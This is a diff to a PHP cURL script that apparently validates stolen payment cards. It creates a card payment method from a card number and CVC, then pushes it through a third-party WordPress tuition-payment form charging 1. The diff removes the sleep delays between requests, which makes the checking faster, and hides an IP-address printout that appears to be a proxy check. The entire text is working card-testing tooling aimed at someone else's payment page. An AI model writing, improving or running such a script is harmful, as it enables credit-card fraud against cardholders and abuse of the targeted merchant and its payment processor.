@@ -59,14 +59,13 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 
 // Execute the cURL request and get the response
 $response = curl_exec($ch);
-sleep(5);
 
 // Check for cURL errors
 if(curl_errno($ch)) {
     echo 'Curl error: ' . curl_error($ch);
 } else {
     // Print the IP address
-    echo 'IP Address: ' . $response;
+    //echo 'IP Address: ' . $response;
 }
 
 // Close the cURL session
@@ -129,7 +128,6 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='
 
 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
-sleep(5);
 
 ////////////////////////////===[2 Req]
 
@@ -166,7 +164,6 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D19507%26_fluentform_6_fluentformnonce%3Db962fdafb0%26_wp_http_referer%3D%252Ftuition-payment%252F%26names%255Bfirst_name%255D%3D%26names%255Blast_name%255D%3D%26email%3Dgloosmoke%2540gmail.com%26input_text%3DNY%26custom-payment-amount%3D1%26payment_method%3Dstripe%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=6');
 
 $result2 = curl_exec($ch);
-sleep(5);
 
 //echo $result1;
 echo $result2;
